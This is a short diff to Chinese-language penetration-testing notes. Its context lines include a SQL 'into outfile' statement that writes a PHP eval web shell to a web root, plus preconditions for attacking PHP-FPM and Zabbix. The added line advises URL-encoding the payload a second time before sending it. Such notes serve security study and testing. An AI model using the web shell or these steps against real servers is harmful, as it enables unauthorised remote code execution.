@@ -149,6 +149,7 @@ select  "<?php eval($_POST[1]);?>"  into outfile "/var/www/html/1.php";
 3、PHP-FPM监听在本机9000端口
 4、libcurl版本>=7.45.0
 ```
+记得把_后面那一大段内容再ur编码一次，发送
 ![](.topwrite/assets/image_1733892617872.png)
 
 对10050的zabbix，命令执行。
